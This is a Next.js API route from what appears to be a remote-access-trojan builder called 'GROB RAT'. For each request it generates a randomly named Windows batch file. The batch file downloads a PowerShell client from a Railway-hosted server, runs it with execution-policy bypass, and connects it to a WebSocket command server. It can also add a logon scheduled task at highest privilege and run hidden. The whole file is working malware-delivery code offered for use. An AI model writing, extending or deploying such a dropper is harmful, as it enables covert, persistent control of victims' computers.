import { NextResponse } from "next/server"
import * as fs from "fs"
import * as path from "path"
import * as crypto from "crypto"

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const hideDesktopIcon = formData.get("hideDesktopIcon") === "true"
    const autoStartup = formData.get("autoStartup") === "true"
    const userUid = formData.get("userUid") as string

    if (!userUid || userUid === "null" || !userUid.trim()) {
      return NextResponse.json({ error: "UID is required", details: "Please re-login" }, { status: 400 })
    }

    const randomName = crypto.randomBytes(8).toString("hex")
    const fileName = `client_${randomName}`

    // Create standalone batch file
    const batchContent = `@echo off
title GROB Client Setup
color 0A
echo.
echo ====================================
echo       GROB RAT Client v2.0
echo ====================================
echo.
echo [+] Server: wss://glistening-mindfulness.up.railway.app
echo [+] User ID: ${userUid}
echo [+] Auto-startup: ${autoStartup ? "Enabled" : "Disabled"}
echo [+] Hidden mode: ${hideDesktopIcon ? "Enabled" : "Disabled"}
echo.

:: Create working directory
if not exist "%TEMP%\\GROB" mkdir "%TEMP%\\GROB"
cd /d "%TEMP%\\GROB"

:: Download PowerShell client
echo [+] Downloading client...
powershell -Command "Invoke-WebRequest -Uri 'https://glistening-mindfulness.up.railway.app/api/client/download' -OutFile 'client.ps1'"

:: Execute PowerShell client
echo [+] Starting client...
powershell -ExecutionPolicy Bypass -File "client.ps1" -ServerUrl "wss://glistening-mindfulness.up.railway.app" -UserId "${userUid}" -AutoStartup:${autoStartup} -Hidden:${hideDesktopIcon}

:: Auto-startup setup
if "${autoStartup}"=="true" (
    echo [+] Setting up auto-startup...
    powershell -Command "Register-ScheduledTask -TaskName 'GROBClient' -Trigger 'AtLogOn' -Action 'PowerShell -ExecutionPolicy Bypass -File \\"%TEMP%\\GROB\\client.ps1\\" -ServerUrl \\"wss://glistening-mindfulness.up.railway.app\\" -UserId \\"${userUid}\\" -AutoStartup:true -Hidden:${hideDesktopIcon}' -RunLevel Highest -Force"
)

echo.
echo [✓] Client started successfully!
echo [✓] Check your admin panel for connection
echo.
timeout /t 3 >nul
exit
`

    const tempDir = path.join(process.cwd(), "dist_temp")
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true })
    }

    const batchFile = path.join(tempDir, `${fileName}.bat`)
    fs.writeFileSync(batchFile, batchContent)

    // Read the batch file
    const batchBuffer = fs.readFileSync(batchFile)

    // Cleanup
    try {
      fs.rmSync(tempDir, { recursive: true, force: true })
    } catch {}

    return new NextResponse(batchBuffer, {
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename="${fileName}.bat"`,
      },
    })

  } catch (error: any) {
    console.error("Standalone builder error:", error)
    return NextResponse.json(
      { error: "Failed to create standalone client", details: error.message },
      { status: 500 }
    )
  }
}
